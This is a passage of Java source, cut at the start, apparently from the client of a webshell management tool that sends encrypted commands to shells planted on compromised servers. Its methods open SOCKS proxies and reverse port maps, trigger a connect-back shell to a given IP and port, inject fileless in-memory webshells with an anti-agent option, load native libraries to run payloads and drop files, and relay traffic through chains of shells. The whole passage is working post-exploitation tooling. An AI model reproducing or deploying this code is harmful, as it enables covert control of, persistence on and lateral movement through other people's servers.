        Map<String, String> params = new LinkedHashMap();
        params.put("action", "write");
        params.put("socketHash", socketHash);
        params.put("extraData", Base64.getEncoder().encodeToString(proxyData));
        JSONObject result = this.parseCommonAction("SocksProxy", params);
        return result;
    }

    public JSONObject clearProxy() throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "clear");
        JSONObject result = this.parseCommonAction("SocksProxy", params);
        return result;
    }

    public JSONObject closeProxy(String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "close");
        params.put("socketHash", socketHash);
        JSONObject result = this.parseCommonAction("SocksProxy", params);
        return result;
    }

    public JSONObject openProxy(String targetIp, String targetPort, String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "create");
        params.put("targetIP", targetIp);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        JSONObject result = this.parseCommonAction("SocksProxy", params);
        return result;
    }

    public JSONObject openProxyAsyc(String targetIp, String targetPort, String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "create");
        params.put("targetIP", targetIp);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        Runnable backgroundRunner = () -> {
            try {
                this.parseCommonAction("SocksProxy", params);
            } catch (Exception var3) {
            }

        };
        (new Thread(backgroundRunner)).start();
        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("msg", "ok");
        return result;
    }

    private void initBodySignature(byte[] resData, int beginIndex, int endIndex) {
        if (beginIndex != -1 && endIndex != -1) {
            int head = beginIndex - 20;
            head = head > 0 ? head : 0;
            this.prefixBytes = Arrays.copyOfRange(resData, head, beginIndex);
            int tail = resData.length - endIndex;
            tail = tail > 20 ? 20 : tail;
            this.suffixBytes = Arrays.copyOfRange(resData, resData.length - endIndex, resData.length - endIndex + tail);
            if (Utils.indexOf(resData, this.prefixBytes) != head || Utils.indexOf(resData, this.suffixBytes) != resData.length - endIndex) {
                this.prefixBytes = null;
                this.suffixBytes = null;
            }

        }
    }

    public JSONObject echo(String content) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("content", content);
        byte[] data = Utils.getData(this.cryptor, "Echo", params, this.effectType);
        Map<String, Object> resultObj = this.doRequestAndParse(data);
        Map<String, String> responseHeader = (Map)resultObj.get("header");
        JSONObject expectedSuccessObj = new JSONObject();
        expectedSuccessObj.put("status", Base64.getEncoder().encodeToString("success".getBytes()));
        expectedSuccessObj.put("msg", Base64.getEncoder().encodeToString(content.getBytes()));
        String expectedSuccessBody = expectedSuccessObj.toString();
        expectedSuccessBody = String.format("{\"status\":\"%s\",\"msg\":\"%s\"}", Base64.getEncoder().encodeToString("success".getBytes()), Base64.getEncoder().encodeToString(content.getBytes()));
        byte[] expectedSuccessBodyBytes = this.cryptor.encrypt(expectedSuccessBody.getBytes());
        byte[] resData = (byte[])resultObj.get("data");
        this.beginIndex = Utils.indexOf(resData, expectedSuccessBodyBytes);
        this.endIndex = resData.length - (this.beginIndex + expectedSuccessBodyBytes.length);
        this.endIndex = this.beginIndex == -1 ? -1 : this.endIndex;
        if (this.beginIndex > 0 || this.endIndex > 0) {
            this.compareMode = Constants.COMPARE_MODE_NUM;
            this.initBodySignature(resData, this.beginIndex, this.endIndex);
            resData = Arrays.copyOfRange(resData, this.beginIndex, resData.length - this.endIndex);
        }

        String resultTxt = "";

        try {
            if (this.effectType.equals("native")) {
                resultTxt = new String(this.cryptor.decryptCompatible(resData));
            } else {
                resultTxt = new String(this.cryptor.decrypt(resData));
            }
        } catch (InvocationTargetException e) {
            if (e.getTargetException() instanceof IllegalBlockSizeException) {
                throw new DecryptException((String)responseHeader.get("status"), new String(resData));
            }
        } catch (Exception e) {
            e.printStackTrace();
        } catch (Throwable t) {
            t.printStackTrace();
        }

        JSONObject result;
        try {
            result = new JSONObject(resultTxt);
        } catch (Exception var14) {
            throw new DecryptException((String)responseHeader.get("status"), new String(resData));
        }

        for(String key : result.keySet()) {
            result.put(key, new String(Base64.getDecoder().decode(result.getString(key)), "UTF-8"));
        }

        return result;
    }

    public JSONObject getBasicInfo(String whatever) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("whatever", whatever);
        JSONObject result = this.parseCommonAction("BasicInfo", params);
        this.offlineHelper.addRecord(this.effectShellEntity.getString("url"), (Map)null, result);
        return result;
    }

    private void showErrorMessage(String title, String msg) {
        Alert alert = new Alert(AlertType.ERROR);
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest((event) -> window.hide());
        alert.setTitle(title);
        alert.setHeaderText("");
        alert.setContentText(msg);
        alert.show();
    }

    public void keepAlive() throws Exception {
        while(true) {
            try {
                Thread.sleep((long)(((new Random()).nextInt(5) + 5) * 60 * 1000));
                int randomStringLength = (new SecureRandom()).nextInt(3000);
                this.echo(Utils.getRandomString(randomStringLength));
            } catch (Exception e) {
                if (e instanceof InterruptedException) {
                    return;
                }

                Platform.runLater(() -> this.showErrorMessage("提示", "由于您长时间未操作，当前连接会话已超时，请重新打开该网站。"));
                return;
            }
        }
    }

    public JSONObject connectBack(String type, String ip, String port) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("type", type);
        params.put("ip", ip);
        params.put("port", port);
        JSONObject result = this.parseCommonAction("ConnectBack", params);
        return result;
    }

    public JSONObject loadNativeLibrary(String libraryPath) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "load");
        params.put("whatever", Utils.getWhatever());
        params.put("libraryPath", libraryPath);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "LoadNativeLibrary", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);

        for(String key : result.keySet()) {
            result.put(key, new String(Base64.getDecoder().decode(result.getString(key)), "UTF-8"));
        }

        return result;
    }

    public JSONObject executePayload(String uploadLibPath, String payload) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "execute");
        params.put("whatever", Utils.getWhatever());
        params.put("uploadLibPath", uploadLibPath);
        params.put("payload", payload);
        JSONObject result = this.parseCommonAction("LoadNativeLibrary", params);
        return result;
    }

    public JSONObject loadLibraryAndexecutePayload(String fileContent, String payload) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "execute");
        params.put("whatever", Utils.getWhatever());
        params.put("fileContent", fileContent);
        params.put("payload", payload);
        JSONObject result = this.parseCommonAction("LoadNativeLibrary", params);
        return result;
    }

    public JSONObject loadLibraryAndfreeFile(String fileContent, String filePath) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "freeFile");
        params.put("whatever", Utils.getWhatever());
        params.put("fileContent", fileContent);
        params.put("filePath", filePath);
        JSONObject result = this.parseCommonAction("LoadNativeLibrary", params);
        return result;
    }

    public JSONObject freeFile(String uploadLibPath, String filePath) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "freeFile");
        params.put("whatever", Utils.getWhatever());
        params.put("uploadLibPath", uploadLibPath);
        params.put("filePath", filePath);
        JSONObject result = this.parseCommonAction("LoadNativeLibrary", params);
        return result;
    }

    public JSONObject loadLibraryAndAntiAgent(String fileContent) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "antiAgent");
        params.put("whatever", Utils.getWhatever());
        params.put("fileContent", fileContent);
        JSONObject result = this.parseCommonAction("LoadNativeLibrary", params);
        return result;
    }

    public JSONObject antiAgent(String uploadLibPath) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "antiAgent");
        params.put("whatever", Utils.getWhatever());
        params.put("uploadLibPath", uploadLibPath);
        JSONObject result = this.parseCommonAction("LoadNativeLibrary", params);
        return result;
    }

    public JSONObject loadLibraryAndtest() throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "test");
        params.put("whatever", Utils.getWhatever());
        JSONObject result = this.parseCommonAction("LoadNativeLibrary", params);
        return result;
    }

    public JSONObject getMemShellTargetClass() throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "get");
        JSONObject result = this.parseCommonAction("MemShell", params);
        return result;
    }

    public JSONObject injectAgentNoFileMemShell(String className, String classBody, boolean isAntiAgent) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "injectAgentNoFile");
        params.put("className", className);
        params.put("classBody", classBody);
        params.put("antiAgent", isAntiAgent + "");
        JSONObject result = this.parseCommonAction("MemShell", params);
        return result;
    }

    public JSONObject injectAgentMemShell(String libPath, String path, String password, boolean isAntiAgent) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "injectAgent");
        params.put("libPath", libPath);
        params.put("path", path);
        String sourceCode = String.format(Constants.JAVA_CODE_TEMPLATE_SHORT, this.cryptor.getTransProtocol("jsp").getDecode());
        byte[] payload = Utils.getClassFromSourceCode(sourceCode);
        params.put("password", Base64.getEncoder().encodeToString(payload));
        params.put("antiAgent", isAntiAgent + "");
        JSONObject result = this.parseCommonAction("MemShell", params);
        return result;
    }

    public JSONObject createReversePortMap(String listenPort) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "create");
        params.put("listenPort", listenPort);
        JSONObject result = this.parseCommonAction("ReversePortMap", params);
        return result;
    }

    public JSONObject readReversePortMapData(String socketHash) throws Exception {
        byte[] resData = null;
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "read");
        params.put("socketHash", socketHash);
        JSONObject result = this.parseCommonAction("ReversePortMap", params);
        return result;
    }

    public boolean writeReversePortMapData(byte[] proxyData, String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "write");
        params.put("socketHash", socketHash);
        params.put("extraData", Base64.getEncoder().encodeToString(proxyData));
        JSONObject result = this.parseCommonAction("ReversePortMap", params);
        return result.getString("status").equals("success");
    }

    public JSONObject listReversePortMap() throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "list");
        JSONObject result = this.parseCommonAction("ReversePortMap", params);
        return result;
    }

    public JSONObject stopReversePortMap(String listenPort) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "stop");
        params.put("listenPort", listenPort);
        JSONObject result = this.parseCommonAction("ReversePortMap", params);
        return result;
    }

    public JSONObject closeReversePortMap(String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("action", "close");
        params.put("socketHash", socketHash);
        JSONObject result = this.parseCommonAction("ReversePortMap", params);
        return result;
    }

    public byte[] warpTransferPayload(byte[] payloadBody, String scriptType, String target, String type, String direction, String effectHeaders) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("target", target);
        params.put("type", type);
        params.put("direction", direction);
        params.put("effectHeaders", effectHeaders);
        params.put("payloadBody", Base64.getEncoder().encodeToString(payloadBody));
        byte[] data = Utils.getData(this.cryptor, "Transfer", params, scriptType);
        return data;
    }

    public Map<String, Object> transferPayload(byte[] payloadBody) throws Exception {
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, payloadBody, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
        return resultObj;
    }

    private Map<String, Object> doRequestAndParse(byte[] data) throws Exception {
        if (!this.needTransfer) {
            return Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
        } else {
            for(int i = this.childList.size() - 1; i >= 0; --i) {
                String scriptType = ((JSONObject)this.shellChains.get(i)).getString("type");
                Map<String, Object> childObj = (Map)this.childList.get(i);
                JSONObject childShellEntity = (JSONObject)childObj.get("childShellEntity");
                String childScriptType = childShellEntity.getString("type");
                Map<String, String> childHeaders = (Map)this.scriptHeaders.get(childScriptType);
                StringBuilder childHeadersStr = new StringBuilder();
                if (childHeaders != null) {
                    for(String headerName : childHeaders.keySet()) {
                        childHeadersStr.append(String.format("%s|%s\n", headerName, childHeaders.get(headerName)));
                    }
                }

                BShell bShell = (BShell)childObj.get("bShell");
                String target = childShellEntity.getString("url");
                int bShellType = bShell.getType();
                String transMode = "HTTP";
                String direction = "Forward";
                if (bShellType == Constants.BSHELL_TYPE_TCP) {
                    transMode = "TCP";
                } else if (bShellType == Constants.BSHELL_TYPE_HTTP) {
                    transMode = "HTTP";
                } else if (bShellType == Constants.BSHELL_TYPE_TCP_REVERSE) {
                    transMode = "TCP";
                    direction = "Reverse";
                }

                data = this.warpTransferPayload(data, scriptType, target, transMode, direction, childHeadersStr.toString());
            }

            return this.transferPayload(data);
        }
    }

    public JSONObject doProxy(String type, String target, String payloadBody) throws Exception {
        Map<String, String> params = new LinkedHashMap();
        params.put("type", type);
        params.put("target", target);
        params.put("payloadBody", payloadBody);
        JSONObject result = this.parseCommonAction("Proxy", params);
        return result;
    }

    private JSONObject parseCommonAction(String payloadName, Map<String, String> params) throws Exception {
        if (this.effectType.equals("aspx") || this.effectType.equals("dotnetCore")) {
            params.put("sessionId", this.sessionId);
        }

        byte[] data = Utils.getData(this.cryptor, payloadName, params, this.effectType);
        Map<String, Object> resultObj = this.doRequestAndParse(data);
        byte[] resData = (byte[])resultObj.get("data");
        resData = extractPayload(resData, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
        String resultTxt;
        if (this.effectType.equals("native")) {
            resultTxt = new String(this.cryptor.decryptCompatible(resData));
        } else {
            try {
                resultTxt = new String(this.cryptor.decrypt(resData));
            } catch (InvocationTargetException var10) {
                this.compareMode = Constants.COMPARE_MODE_BYTES;
                resData = (byte[])resultObj.get("data");
                resData = extractPayload(resData, this.compareMode, this.beginIndex, this.endIndex, this.prefixBytes, this.suffixBytes);
                resultTxt = new String(this.cryptor.decrypt(resData));
            }
        }

        JSONObject result = new JSONObject(resultTxt);

        for(String key : result.keySet()) {
            result.put(key, new String(Base64.getDecoder().decode(result.getString(key)), "UTF-8"));
        }

        return result;
    }

    public void setCompareMode(int compareMode) {
        this.compareMode = compareMode;
    }

    private static byte[] extractPayload(byte[] resData, int compareMode, int beginIndex, int endIndex, byte[] prefixBytes, byte[] suffixBytes) {
        if (compareMode == Constants.COMPARE_MODE_NUM) {
            if (resData.length - endIndex >= beginIndex) {
                resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
            }
        } else if (compareMode == Constants.COMPARE_MODE_BYTES) {
            beginIndex = Utils.indexOf(resData, prefixBytes) + prefixBytes.length;
            endIndex = resData.length - Utils.indexOf(resData, suffixBytes);
            if (resData.length - endIndex >= beginIndex) {
                resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
            }
        }

        return resData;
    }
}
